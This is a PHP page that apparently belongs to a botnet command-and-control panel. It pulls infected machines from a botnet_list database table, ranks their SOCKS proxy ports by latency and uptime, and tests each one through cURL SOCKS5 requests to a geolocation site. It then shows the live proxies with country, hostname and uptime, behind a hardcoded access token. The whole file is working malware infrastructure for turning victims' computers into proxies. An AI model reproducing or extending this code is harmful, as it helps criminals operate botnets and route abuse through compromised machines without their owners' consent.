<?php
$socks_token_key = md5(__FILE__ . $_SERVER['HTTP_HOST'] . 'SALT-Eb5aelah-SALT');


define('SOCKS_CHECK_SLICE', 30);
define('SOCKET_TIMEOUT', 20);



require_once __DIR__.'/lib/guiutil.php';
require_once __DIR__.'/lib/util.php';


if (isset($_GET['ajax'])){
	switch ($_GET['ajax']){
		case 'whois':
			$checker = new stdClass;
			$data = file_get_contents('http://www.iplocation.net/index.php?query='.urlencode($_GET['ip']));
			$whois = geolocation_parse($data);
			header('Content-Type: application/json');
			echo json_encode($whois);

            if (!empty($_GET['reset_bot']) && strncmp($whois[0], 'E:', 2) !== 0){
                require_once 'system/lib/dbpdo.php';
                dbPDO::singleton()->query(
                    'UPDATE `botnet_list`
                     SET `whois_info`=:whois
                     WHERE `bot_id`=:bot_id
                     ;', array(
                    ':bot_id' => $_GET['reset_bot'],
                    ':whois' => implode(' ', $whois),
                ));
            }
			break;
		default:
			echo 'Unknown';
	}
	die();
}

if(!defined('__CP__')){
	if (!isset($_GET['token']) || $_GET['token'] != $socks_token_key)
		die('Try to make-up a better token :)');
	define('TOKEN_ACCESS', true);
	} else define('TOKEN_ACCESS', false);

if (TOKEN_ACCESS){
	# Access by token: include all prerequisites
	echo <<<HTML
	<base href="../" />
	<script src="theme/js/jquery-1.7.1.min.js"></script>
	<link href="theme/style.css" rel="stylesheet" type="text/css" media="screen" />
HTML;
	
	require_once('./global.php');
	if(!@include_once('./config.php'))die('Hello! How are you?');
	if(!connectToDb())die(mysqlErrorEx());

	require_once('lng/botnet_socks.lng.en.php');
	chdir('..');
	} else {
	# Generic access
	ThemeBegin(LNG_REPORTS, 0, getBotJsMenu('botmenu'), 0);
	echo
		str_replace('{WIDTH}', '100%', THEME_DIALOG_BEGIN).
		str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, LNG_REPORTS.THEME_STRING_SPACE), THEME_DIALOG_TITLE);
	echo '<tr><td>';
	echo '<a href="', 'http://', $_SERVER['HTTP_HOST'] , '/', dirname($_SERVER['REQUEST_URI']), '/system/botnet_socks.php?token=', $socks_token_key, '" target="_blank">', LNG_TOKEN_ACCESS, '</a>';
	echo '</td></tr><tr><td>';
	}






$r_botsocks = mysql_query(<<<SQL
	SELECT
		`botnet`, `bot_id`,
		`ipv4` AS `ip`, `tcpport_s1` AS `port`,
		(UNIX_TIMESTAMP() - `rtime_last`)/60 AS `rtime_m`,
		(UNIX_TIMESTAMP() - `rtime_first`)/60/60 AS `uptime`,
		`country` AS `country`,
		(net_latency/1000) AS `lag`
	FROM `botnet_list`
	WHERE
		LOCATE(`ipv4`, `ipv4_list`) > 0
	HAVING
		`lag`<5 AND `rtime_m` < 15
	ORDER BY
		(	(`rtime_m`<5)*2 + (`rtime_m`<15) + (`rtime_m`<30) +
			(`lag`<0.5)*2 + (`lag`<1) + (`lag`<2) +
			(`uptime`>6) + (`uptime`>12) + (`uptime`>24)*2
			)  DESC,
		FLOOR(`lag`) ASC,
		`uptime` DESC,
		`country` ASC
SQL
	);

$socks_list = array();
echo '<table id="socks_list"><caption><img src="theme/throbber.gif" /></caption>';
echo '<THEAD><tr>',
	'<th>', LNG_COLUMN_SOCKS, '</th>', // iplocation.net
	'<th>', LNG_COLUMN_COUNTRY, '</th>',
	'<th>', LNG_COLUMN_GEOLOCATION, '</th>', // Country, State, City
	'<th>', LNG_COLUMN_HOSTNAME, '</th>', // Host resolve
	'<th>', LNG_COLUMN_UPTIME, '</th>',
	'<th>', LNG_COLUMN_LAG, '</th>',
	'</tr></THEAD>';
echo '<TBODY>';
while ($r_botsocks && !is_bool($r = mysql_fetch_assoc($r_botsocks))){
	$ip = binaryIpToString($r['ip']);
	$socks = $ip.':'.$r['port'];
	$socks_list[] = array($ip, $r['port']);
	echo '<tr class="pending">', 
		'<th>', $socks, '</th>', // SOCKS
		'<td>', countryFlag($r['country'], true), '</td>', // Country
		'<td>', '</td>', // Geolocation
		'<td>', '</td>', // Hostname
		'<td>', round($r['uptime'],1), ' ', LNG_COLUMN_SUFF_HOURS, '</td>', // Uptime
		'<td>', round($r['lag'],2), ' ', LNG_COLUMN_SUFF_SECONDS, '</td>', // Lag
		'</tr>'
		;
	}
echo '</TBODY>';
echo '</table>';

echo <<<HTML
<script src="theme/js/botnet_socks.js"></script>
HTML;




@ob_end_flush();
@ob_implicit_flush(1);
echo '<!--', str_repeat('----------', 1024), '-->';

$whoiscache = new WhoisCache('system/data/botnet_socks-whoiscache.dat');
$whoiscache->load();
$whoiscache->cleanup();

# First, display the cached ones
$socks_check = array();
foreach ($socks_list as $socks_id => $r){
    list($ip, $port) = $r;

    $whois = $whoiscache->get($ip);
    if (is_null($whois))
        $socks_check[$socks_id] = $r;
    else # Print the cached info
        echo js_socks_add($socks_id, 'ok', $whois[0], $whois[1]);
}

set_time_limit(SOCKET_TIMEOUT * ceil(count($socks_check)/SOCKS_CHECK_SLICE + 2));

# Check the remaining sockses
for ($i=0; $i<ceil(count($socks_check)/SOCKS_CHECK_SLICE); $i++){

    $socks_check_slice = array_slice($socks_check, $i*SOCKS_CHECK_SLICE, SOCKS_CHECK_SLICE, true);

    if (empty($socks_check_slice))
        break;

    $mh = curl_multi_init();
    $chs = array();
    foreach ($socks_check_slice as $socks_id => $r){
        list($ip,$port) = $r;
        $socks = "$ip:$port";

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_VERBOSE => 1,
            CURLOPT_URL => 'http://www.iplocation.net/',
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_PROXY => $socks,
            CURLOPT_PROXYTYPE => CURLPROXY_SOCKS5,
            CURLOPT_TIMEOUT => CURLOPT_CONNECTTIMEOUT,
            CURLOPT_AUTOREFERER => 1,
            CURLOPT_TIMEOUT => SOCKET_TIMEOUT,
            CURLOPT_TIMEOUT_MS
        ));
        curl_multi_add_handle($mh, $ch);

        $chs[$socks_id] = $ch;
    }

    $running = true;
    do {
        while (($execrun = curl_multi_exec($mh, $running)) == CURLM_CALL_MULTI_PERFORM) ;
        if ($execrun != CURLM_OK)
            break;

        // Done requests
        while ($done = curl_multi_info_read($mh)) {
            $result = $done['result'];
            $ch = $done['handle'];
            $socks_id = array_search($ch, $chs, true);
            list($ip,$port) = $socks_check[$socks_id];

            // Identity errors
            $ret_error = null;
            switch ($result){
                case CURLE_OUT_OF_MEMORY: $ret_error = 'Out of memory'; break;

                case CURLE_COULDNT_CONNECT: $ret_error = 'Connect failed'; break;
                case CURLE_COULDNT_RESOLVE_HOST: $ret_error = 'Resolve host failed'; break;
                case CURLE_COULDNT_RESOLVE_PROXY: $ret_error = 'Resolve proxy failed'; break;
                case CURLE_OPERATION_TIMEOUTED: $ret_error = 'Timeouted'; break;

                case CURLE_WRITE_ERROR: $ret_error = 'Write error'; break;
                case CURLE_READ_ERROR: $ret_error = 'Read error'; break;
                case CURLE_RECV_ERROR: $ret_error = 'Recv error'; break;
                case CURLE_SEND_ERROR: $ret_error = 'Send error'; break;

                case CURLE_GOT_NOTHING: $ret_error = 'Got nothing'; break;
                case CURLE_TOO_MANY_REDIRECTS: $ret_error = 'Too many redirects'; break;
                case CURLE_UNSUPPORTED_PROTOCOL: $ret_error = 'Unsupported protocol'; break;
                case CURLE_URL_MALFORMAT: $ret_error = 'Malformed URL'; break;

                case CURLE_HTTP_NOT_FOUND: $ret_error = 'HTTP 404'; break;
                case CURLE_HTTP_PORT_FAILED: $ret_error = 'HTTP port failed'; break;

                case CURLE_OK: $ret_error = null; break;

                default: $ret_error = '(cURL error #'.$result.')'; break;
            }

            // Handle HTTP error codes
            if (is_null($ret_error)){
                $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if ($status !== 200)
                    $ret_error = 'HTTP error '.$status;
            }

            // Handle error message
            if (!is_null($ret_error)){
                echo js_socks_add($socks_id, 'fail', $ret_error, '-');
            } else {
                // Handle success
                $output = curl_multi_getcontent($ch);

                # Parse the data
                list($geoloc, $hostname) = geolocation_parse($output);
                if (is_null($hostname))
                    $hostname = gethostbyaddr($ip);

                # Add to the cache
                $whoiscache->set($ip, array($geoloc, $hostname));

                echo js_socks_add($socks_id, 'ok', $geoloc, $hostname);
            }

            // Remove the handle
            curl_multi_remove_handle($mh, $ch);
        }

        // Block for i/o
        if ($running)
            curl_multi_select($mh, 1.0);
    } while($running);
    curl_multi_close($mh);
}

# Finish
print js_socks_finish();
$whoiscache->save();






/* Whois cache */
class WhoisCache {
	function __construct($f = null){
		$this->f = $f;
		$this->cache = array();
		}
	function load(){
		$this->cache = @include $this->f;
		if (!is_array($this->cache))
			$this->cache = array();
		}
	function cleanup(){
		foreach ($this->cache as $ip => $data)
			if ($data[0] < (  time()-60*60*24  ))
				unset($this->cache[$ip]);
		}
	function save(){
		$cache = var_export($this->cache, 1);
		file_put_contents($this->f, "<?php return $cache;");
		}
	
	function get($ip){
		if (!isset($this->cache[$ip]))
			return null;
		# Get rid of the timestamp & return
		return array_slice($this->cache[$ip], 1);
		}
	function set($ip, array $data){
		array_unshift($data,  time()  ); # timestamp
		$this->cache[$ip] = $data;
		}
	}

/* JS interactions */
function js_function($func, $socks_id, array $args){
	foreach ($args as &$arg)
		if (is_string($arg))
			$arg = nl2br(htmlspecialchars($arg));
	return sprintf("<script>%s.apply(%s, %s);</script>\n\n\n",
		$func,
		json_encode($socks_id),
		json_encode($args)
		);
	}
function js_socks_add($socks_id, $status, $geoloc, $hostname){
	return js_function('window.socks_add', $socks_id, 
			array($status, $geoloc, $hostname)
			);
	}
function js_socks_finish(){
	return js_function('window.socks_finish', null, array());
	}
